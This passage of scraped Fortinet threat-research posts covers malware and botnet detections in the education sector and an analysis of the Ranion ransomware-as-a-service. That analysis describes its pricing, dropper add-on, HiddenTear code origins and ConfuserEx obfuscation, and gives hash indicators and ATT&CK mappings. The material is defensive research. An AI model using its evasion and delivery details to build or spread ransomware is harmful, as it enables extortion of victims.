the Backdoor.DouplePulsar signature was triggered. The detection was most observed in Brazil, South Africa, and India, which account for 70% of the total Backdoor.DouplePulsar detections triggered. Botnet and AV Detections in the Education Sector Next, we compared Botnet activities observed in the US and worldwide to find trends. They turned out to be almost in sync. Unlike IPS triggers, which record blocked attacks, botnet detections indicate active botnet malware within a network. The Mirai IoT botnet led both regions, followed by Gh0st Rat and Zeroaccess. Together, they account for more than 50% of the botnet activities in the US and global education sectors. As the malware source codes of those three botnets are readily available, the education sector is a potential target of both serious and novice botnet attackers. The following graphs show the top five AV detection observed in the education sector in the US and worldwide, from August 11 th to September 10 th , 2021. This data indicates which malware was blocked during that period. Cryxos was to most common malware triggered in the US as well as worldwide. This malicious JavaScript variant is typically associated with fake call support scams. It shows a fake pop-up warning that the victim’s machine has serious issues. The victim is further instructed to call support for a bogus fix as they risk losing sensitive data. The scammers then ask for a payment, either through a credit card or via gift cards. Other common attacks included: W32/Swizzor!B.tr is an old Windows malware that has been around for years. The malware is designed to show unwanted ads on a targeted machine or download and execute remote files. As a result, a device infected with Swizzor may show other behaviors (i.e., data exfiltration) that are known to be associated with the malware. JS/Miner.BP!tr is a malicious javascript that mines for cryptocurrency without the user’s knowledge. A victim’s machine may experience slower performance and higher electricity usage. W32/Agent.DRI!tr.dldr is a type of trojan malware designed to download and execute remote files. Just like Switzzor, a machine infected with this malware may exhibit malicious behaviors. W32/RanumBot.X!tr is a type of Trojan that opens a backdoor and awaits commands from its Command & Control server. Its behavior is dependent on the remote commands it receives. Conclusion - Education Sectors As with any other industry sector, educational institutions are not exempt from cyberattacks. Backdoor infections lead to information leaks that may be vital to an institution's research effort or steal PII of students, parents, and faculty. A publicized attack can lead to financial loss, brand damage, and loss of faith and reputation by its affiliates and partners. Even worse, not only can ransomware be deployed against a vulnerable network, but access to a compromised network can also be sold on the black market to other ransomware gangs. One of the most critical takeaways from nearly every research of this kind is that criminals overwhelmingly target known vulnerabilities with available patches. This makes cyber hygiene a top priority. Similarly, it reemphasizes the need to backup critical data. If regular backups are not implemented or are not properly managed, it could cost the institutions hundreds of thousands of dollars to replace affected devices. However, even when a victim has secured backups and an excellent recovery plan in place, attackers will still threaten to leak stolen data. If the ransom is not paid, they release everything on the dark web. Therefore, it is imperative to have a solid prevention and recovery plan against ransomware in place, including the encryption of all data at rest. Similarly, botnets are an indirect threat to those organizations that become a part of the attacker’s infrastructure. The attacker can exploit their bandwidth to launch DDoS attacks against other parties, move laterally to other institutions, or leverage the compute power for crypto mining or other illicit purposes. This will eventually result in a loss of productivity and revenue for those victims. We cannot emphasize more emphatically the following statement from a blog posted by Fortinet earlier this year, entitled, “ Threats Impacting Education Cybersecurity ”: “It’s common knowledge that the cost and effort associated with attack prevention tend to be significantly less than the cost associated with the fallout of a successful attack. Therefore, in education cybersecurity and beyond, investing in comprehensive cybersecurity strategies not only protects sensitive data and infrastructure but can also help reduce costs down the line.” Fortinet Protections and Recommendations FortiGuard Labs has the following AV coverage in place for the malware associated with this blog: FortiGuard Labs has the following AV coverage in place for malware associated with this blog: W32/Ransom.REVIL!tr W32/Ransom_Revil.R03BC0DHU20 W32/DarkSide.B!tr.ransom W32/Darkside.AO!tr.ransom ELF/Darkside.A9B5!tr.ransom W32/Darkside.50B7!tr.ransom W32/Darkside.B7D5!tr.ransom W32/Filecoder.NYO!tr.ransom W32/Zudochka.DLR!tr.ransom W32/DoppelPaymer.BM!tr PossibleThreat.PALLASNET.H W32/PossibleThreat W32/RanumBox.X!tr W32/Agent.BMGF!tr.dldr JS/Miner.BP!tr W32/Swizzor.B!tr JS/Cryxos.DEB1!tr FortiGuard Labs has the following IPS coverage in place for the malware associated with this blog: Telerik.Web.UI.RadAsyncUpload.Handling.Arbitrary.File.Upload PHPUnit.Eval-stdin.PHP.Remote.Code.Execution Apache.Struts.2.Jakarta.Multipart.Parser.Code.Execution ThinkPHP.Controller.Parameter.Remote.Code.Execution Dasan.GPON.Remote.Code.Execution NTP.Monlist.Command.DoS Nmap.Script.Scanner SolarWinds.SUNBURST.Backdoor Port.Scanning Backdoor.DoublePulsar Qualys.Vulnerability.Scanner Mirai.Botnet XcodeGhost Andromeda.Botnet Torpig.Mebroot.Botnet Zeroaccess.Botnet Backdoor.Cobalt.Strike.Beacon Kaseya.VSA.Remote.Code.Execution Darkside.Botnet The Fortinet fabric can offer end to end protection to educational institutions using the following technologies - FortiMail (blocking phishing attacks and malicious attachments), Web Filtering (blocking malicious URLs), FortiEDR (real-time and cloud-based protection), FortiSandbox (identifying and preventing unknown attacks), FortiToken (multi-factor authentication), and intent-based segmentation (preventing lateral movement). Organizations are also strongly encouraged to conduct ongoing end-user training designed to educate and inform personnel about the latest phishing/spearphishing techniques and how to spot and respond to them. This should include encouraging employees to never open attachments from someone they don't know and always treat emails from unrecognized/untrusted senders with caution. Since it has been reported that many phishing and spearphishing attacks are being delivered as part of social engineering distribution mechanisms, end-users must also be made aware of the various types of attacks currently in use. The FortiPhish cloud-based phishing simulation service uses real-world simulated phishing attacks and analysis to test user awareness and vigilance and help hone training efforts. Regular training sessions on how to spot emails with malicious attachments or links combined with impromptu tests increase user awareness and helps prevent initial access into the network. Zero Trust Network Access (ZTNA) addresses all types of attacks/threats: Reduces Attack Surface—ZTNA only allows access to specifically requested applications rather than the network-level access provided by traditional VPN. Ensures Endpoint Security Compliance—Checks to ensure the endpoint is compliant with your security policies (no critical vulnerabilities, has adequate security enabled, etc.) and only grants access to compliant endpoints. Verifies that users and devices accessing resources are “authorized.”  Identifies devices and users on a per-session basis and uses that information to make smarter decisions for application access (Should that device be allowed to access this application?  How about if the connection is from xyz geolocation? What about after-hours?). Not all endpoints should have access to all resources because they are connected to the local network or are part of the domain. Segmentation – reduces exposure in the event of compromise by preventing the lateral movement of malware. Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/ranion-ransomware-quiet-and-persistent-raas": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-09-30",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Many thanks to Val Saengphaibul who contributed to this blog. Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Encrypts files on the compromised machines and demands ransom from the victim to recover the encrypted files. Severity level: High Ranion is a Ransom-as-a-Service (RaaS) that has enjoyed unusual longevity as it has been active since at least February 2017. While its activities and purpose—encrypting files on compromised machines and receiving ransom payment from the user to recover their files—may seem the same as other ransomware in the public’s eyes, the truth is that the inner workings of Ranion RaaS are unlike other ransomware. In this blog, FortiGuard Labs will explain how Ranion RaaS works. The opening lines of The Tale of Heike, a martial epic about the civil war between the Taira and Minamoto clans in 12 th -century Japan, help describe the rise and fall of various ransomware groups in 2021. “The Jetavana Temple bells ring the passing of all things. Twinned sala trees, white in full flower, declare the great man's certain fall. The arrogant do not long endure: They are like a dream one night in spring. The bold and brave perish in the end: They are as dust before the wind.” ― Royall Tyler, The Tale of the Heike Ransomware Operations are Short-Lived For those of us monitoring cybercriminal organizations and malware , ransomware often has a very short shelf life. Some of the most notable ransomware movements in 2021 include: Disappearance: The REvil (aka Sodinokibi) gang that had been active since 2019 went dark in June. The Avaddon ransomware group halted its operations in June. It had begun its operations in 2019. The Ragnarok ransomware gang, in operation since 2019, shut itself down in August and released its decryption key. Darkside first appeared in 2020 and closed in May after compromising a major US pipeline company. FonixCrypter ransomware gave up its criminal life in January and released a decryption tool and its master decryption key. The master decryption key can decrypt all files, regardless of the victim, that had previously been encrypted by FonixCrypter. Debut and Rebranding: Ads for Blackmatter ransomware went up on cyber underground forums in July. While Blackmatter is not a rebrand of another ransomware, affiliation with the Darkside gang is rumored. Haron ransomware debuted in July and is based on Thanos and Abaddon ransomware. Doppelpaymar ransomware was rebranded as Grief (PayOrGrief). SynAck ransomware was rebranded as El_Cometa in August. The average life span of the ransomware listed above, that either disappeared or rebranded itself in 2021, is a bit less than two years. Reasons for halting operations vary from one ransomware group to another, but they usually do so to escape the unwanted attentions of law enforcement and security researchers. Ranion Still Going Four Years Later The Ranion ransomware variant that FortiGuard Labs recently came across bucks that trend. The Ranison ransomware family appears to have been around since at least early 2017, giving it more than four years of longevity. In February of that year, Daniel Smith at Radware Security shed the first light on the Ranion ransomware, describing it as Ransomware-as-a-service. Surprisingly, its website on the Dark Web has remained relatively unchanged: the Ranion developer still maintains its claim that Ranion was created for educational purposes and asks users not to use the ransomware for illegal activities. The latest version of Ranion, version 1.21, was released in July 2021. Amazingly, the Ranion developer has updated the ransomware every month in 2021 (except for May), including updates for detection evasion, which casts doubt on the claim that the ransomware is for educational purposes. Another interesting data point is that version 1.08 was released in at least January 2018 and was only updated seven times over a 35-month period (January 2018 – December 2020). However, it has seen rapid acceleration in its development in 2021, with six updates over a seven-month period for unknown reasons. Each update made in 2021 contains additional code using an open-source program named ConfuserEx to evade detection and protect the security vendors’ identities. We will touch on this part later. Ranion RaaS Explained The latest version of Ranion ransomware is designed to encrypt files on a compromised machine using the following 44 file extensions, an increase of five new file types over previous analyses (newly added extensions are highlighted in orange): Although the ransomware is not designed to encrypt executable files, the Ranion developers state that users “can request other additional file types/extensions to encrypt for free as any files can be a target of Ranion ransomware.” How Ranion Makes Money Originally, back in 2017, Ranion offered users two support packages (a 1-year and a 6-months service). Today, the Ranion team offers four support packages: Elite, Premium, Standard, and Test. Figure 3: Ranion ransomware packages and prices Previously, the most expensive package was offered for 0.95 bitcoin and the cheapest for 0.60 bitcoin. In February 2017, one bitcoin was worth about 1,200 US dollars, which means these packages sold for around 1,140 USD and 720 USD, respectively. As of September 2021, one bitcoin exchanged for around 50,000 USD so Ranion developers have adjusted their prices, and they also now offer discounts for easy-to-buy add-on options. Ranion’s business model is quite different from other RaaS vendors. Typically, Ransomware-as-a-Service vendors pay out 60%-80% of any ransoms collected to their “affiliates” that have successfully installed their ransomware onto a victim’s machine. The Ranion developers do not take a middleman’s cut. Instead, their affiliates pay for the RaaS service upfront, and they then receive 100% of any ransoms collected. And while some RaaS vendors try to recruit experienced affiliates, and often screen potential affiliates before allowing them to sign up for the service, Ranion developers do not. This is one of the reasons why many inexperienced affiliates start with Ranion. It allows then to get used to the ransom operation. It is also a choice for affiliates who were unable to pass the screening process imposed by other ransomware gangs, thereby lowering the bar for entry. To see how well this model works, we tracked some Bitcoin wallets used by one of the older Ranion samples for ransom payment. Two moderate payments, totaling about USD $153 and $460 worth of Bitcoin, were made to the wallet within a week of the Ranion sample being made available. But a Bitcoin wallet used by Ranion has recorded transactions from two other Bitcoin wallets. About $4.7 million USD worth of Bitcoin was transferred to one of those wallets from over 300 different Bitcoin wallets. Dropper Add-On Another notable characteristic of Ranion is that it provides an opportunity for buyers to purchase a dropper add-on. At first glance, a “dropper” may sound like a malware add-on that Ranion affiliates can use to deliver ransomware, but it’s not. According to an FAQ posted on the purchase site, the add-on dropper has the following description: “ RANION can download a program of yours (exe file) and execute it after encryption process ended. ” For example, an attacker might use this add-on to silently download and install a remote access tool “RAT” on a victim’s machine infected with Ranion. Even if the victim opts to pay ransom, the Ranion decrypter only decrypts the encrypted files but does not remove the RAT. The Ranion affiliate can then turn to other RaaS services that are willing to purchase existing corporate access (recent Lockbit 2.0 and Blackmatter RaaS quickly come to mind) and sell that compromised victim for additional profit. This scheme can surely be “educational,” but it’s only good for ransomware affiliates. 1 AUP is available for purchase The Ranion Ransomware Delivery Method The Ranion ransomware’s delivery method recently observed by FortiGuard Labs is very straightforward. It was done through a spearphishing email with a zip file attachment that included the Ranion ransomware executable. As Ranion is more suited for beginner threat actors, the lack of sophistication in their ransomware delivery might be a reason why Ranion has not gained household status in the ransomware realm. This may also be why they have managed to stay under the radar for more than four years. Ranion’s ransom message supports eight languages by default (English, Russian, German, French, Spanish, Italian, Dutch, and Persian). Any regions in which those languages are primarily used can be a target of Ranion. Ranion Ransomware Origin: HiddenTear Copycat? Ranion bases its code on the open-source proof-of-concept ransomware known as HiddenTear. There are some code similarities between the two projects. The above screenshot is from HiddenTear’s implantation of an encryption function. It can be found at https://github.com/goliate/hidden-tear/blob/master/hidden-tear/hidden-tear/Form1.cs . For comparison, Ranion’s implementation is below: To encrypt files, HiddenTear uses this function. Ranion implements its encryption in a similar fashion. These are just two examples. Overall programming resemblance can be seen in a variety places. In addition, Ranion kept their resource section similar to HiddenTear’s as well. NOTE: This Ranion variant is from 2017 and has a SHA256 hash value of eed03a9564aee24a68b2cade89d7fbe9929e95751a9fde4539c7896fda6bdcb5 To Be FFFFUUUUDDDD To be fully undetectable, the Ranion team has consistently relied on the ConfuserEx project, which is the successor of the now defunct Confuser project. It is a free and open-source obfuscator that makes malware harder to analyze by “protecting” .NET applications through symbol renaming, anti-debugging, encryption, compression, and other functions. (For more info, please see the github project page here .) The 2017 Ranion variant analyzed below was “protected” by the Confuser project. The following 2021 variant of Ranion was “protected” using the ConfuserEx project. While ConfuserEx is able to do what it says, which is “protect” .NET applications, in this case it is protecting malware from being detected by the AV industry via evasion techniques. Conclusion - Ranion Ransomware HiddenTear-based Ranion is a low-profile, low-cost RaaS that has not achieved the same success of other, more notorious ransomware gangs. However, this ransom service provides enough basic features for new threat actors to use it as a steppingstone for working with more sophisticated malicious services. Ranion is only “educational” in that it helps train wannabe cyber criminals inflict the same damage as other ransomware variants that have simply adopted more polished and sophisticated delivery and propagation mechanisms. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s AntiVirus and FortiEDR services, as follows: MSIL/Kryptik.LMX!tr MSIL/Agent.AZG!tr MSIL/Agent.BJU!tr MSIL/Bladabindi.FM!tr MSIL/Filecoder.FU!tr MSIL/GenKryptik.BLYY!tr MSIL/GenKryptik.FEWS!tr W32/Crypmodadv.A!tr W32/DOTHETUK.FU!tr.ransom W32/Hesv.BXFI!tr Indicators of Compromise (IOCs): SHA2: 52f6e8c0c28f802d8dfd9138bcc971d449d0526469a36541359b6fc31d44d7dc d63f032180d6cbc3165f79dac13f81e69f3176b06f0ff4b162b167e4f45f5e93 f687c51ee4889c6a35536d06c87b0123d17a483f7e2f5efcfb423fba94e186be f18044a85ceb3c472ae57e3473e2f14f945f22a9df634caa242b11e5f81c561b e4c42969a0327ce133b8b6dd52b0f2e926fbc43a48cf2abbd78d521e310b00e4 41ad23008aea13bccf60249c24ee290e9867223d783bc9ddc4234b8e1d21008d d894cfa1f2e55ea8fb61598d1312d92c6c1667f97ec683dfa5b5350b32402099 2a8f7abaa6b896bdcc8f73a78af89274df5ee5f586edb88a0b4fd0b06cbaf6bd 19b2da9261d163d3a8e25916b0c960bae36d4334172faa2eb7f720c7483f0fb1 434bbb0e4f289944e6c1fafc11e7f3353056857fb90abafd17e2c6ec697d94b3 bbe77c293bf11c5e8d26ff1583cf546a346de5d666e5558b17f056f1117ddaf8 7afbb979ac6485cbe4d21955dd0f4444d67d2b99aa3d420c09bcc7d54949ed7c ac5e6f8e646311bf3645ccdccf7119712ada6811d973444d3a763d17083ef028 2ab7ba4aa579ffda113b3f1a693cb2f6b45c5adb833301762d623089f5e37694 4ad4aabd3ec941e6eb442aadae23e01539f63c093582ebf9239681fe399c7571 e28afea1a286b27c9f4578cb27729e180dd20f406282e489328e11722b37af73 8a4298a5c2101baf0315a2c5ed297a6b9912c673a200a7082fb96fcaa21a7316 798a618bf3b817751de722bc84475d5dca798fb48e844804d530e34e920fad09 bd82bb30089383547fcc1ab8181c957f770a99c1499db211fa3245135fcce2be eba37b0cef846c16bca30804557d7dae57b16cda506a111e2e4c6f7ef54cab70 507cc65037febbad93cd5a4c10d1e870f4f73069484bd7913349deb139c18ea2 b93a45691e955d4600dde6219125f0a38b0544ad48872bc4ebda5436cf2c0bc0 abf13688180d505d07b04a6643941a571de1efd97b46631abfafd555863ec33e 0f2bbf749501297928efbd4a12d8a1858c7944516e8b15817988a429eae4e632 a9671f6455895b1e0875eec277015672ea816dc5299cfd519db2dc4bc38ce693 0a59c6b2ec5dbaa7e36b52dc494d1e58e918f32695cfb28104a5c82b09a9554f ca7aaa3de1948dc882d55d40a0269a145e34f1e07b2b1e932040863e6d1dedb8 27cb1df4a3092c42ddfd93db50cc78813a823a881e6d131410915d0ded6515c4 46b9c46520f00b25924cc0a137393f67a0f4395da8cdc37b32985b90d7285252 46462ba2ac8018901239800f1c4562a31618b1565fe559ab826feef303adab8d df7c5267c9e61d7b23a3a771623c6b274fb601023725a8af1b8bc25ae8bcbdb6 0085d31140895d16a2f92a77b62fb50db0d05fa47b447e21bca062532b5bf0d2 780a576b7ea69b46eb8a698aac0c6ee6e2e426fddcd7a99b749f5aa083e8f72b 94968c73dacfd68500ca59905e410ca4ccafe92cd8e223ed47ad916ee82a6dfb c18c9cf30056d9ebfda69bb9869a38b5ab2d2e3d388a747d7ec8516e022aa7e9 19d9ec2713d913d5325a72ce646351a2384d86efd5dcecebb354ef2bc9e801a2 c38e068677903ccd9b117bacaa3b201616668e449856f8d14894f9acf3f6e9cc 378b34a3e1f760dc7d6c5ff742c543a0184a255c7c3422e348eab05dca1377f9 e9352eb25a1ef3fc8d88fd62a4253d4b8db3931366f012e9ee7916818f74ad55 f7b6ac95cbf4f4122c67e3f841de1152cb032e36d768cd71618cbaf95f131727 df16d6b57a0290b8d7276285020cf6cf5e7c4a561516500fd44e862ea32c1073 dbd00dffb77998d4b0c9946e727279831f19e5d58059b0de353cb191f6c3ca00 1bbc33db0c52d5c3f2798f726bb476cf20d00eeae971e98926bbfbf194e7e03c 98f16b75d1c9e3c8914b10de4b6286397285d226785b42766847b35558ee0dc7 86c6a8c1cd461dafdc30ce37eca355f096ff35ccd48b4de3f2f3bd56d0cef543 c5234f098cf2319c813e8025e0ea04b4f45de4ad195b64ba80fe9a098de54431 0361585476c9e04cbe9efac74fe76e32d84e2e682ac4a8e5f67860a719e7b6d0 1fdaae6a5b1d69d795a07b5518568964dc53e181b22ad2427e7f10c60d61241b 4824c68f18089c44af8426b9a2d7960f5caa572777a46b3a172093b321acbf1d eed03a9564aee24a68b2cade89d7fbe9929e95751a9fde4539c7896fda6bdcb5 023b12665ff5c46331ece74d220c52a28439ada61210183bbd921e1ef833645c aa9bbffae11e2a2af53acbb56129d99cb93c78c98202f5c19b095f9ed296a2ce ea00fffa874669e743d125fcdb55ba591a54d469c621eada61f304495269a35c f389a83b1309ff17c9c0faf1d9e079ceae3b4111c6813ad50bd451a9a19b291b 33d24a576f00847d44315c1d6d588a3aa45031dec2b1590bc67bc6800e455cf6 MITRE ATT&CK information Execution - T1204.002: Malicious File Persistence - T1547.001: Registry Run Keys/Startup Folder Privilege Escalation - T1548.002: Bypass User Account Control Defense Evasion - T1027.002: Software Packing - T1548.002: Bypass User Account Control - T1562.001: Disable or Modify Tools Discovery - T1083: File and Directory Discovery Impact - T1486: Data Encrypted for Impact - T1491.001: Internal Defacement Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        }
    ]
}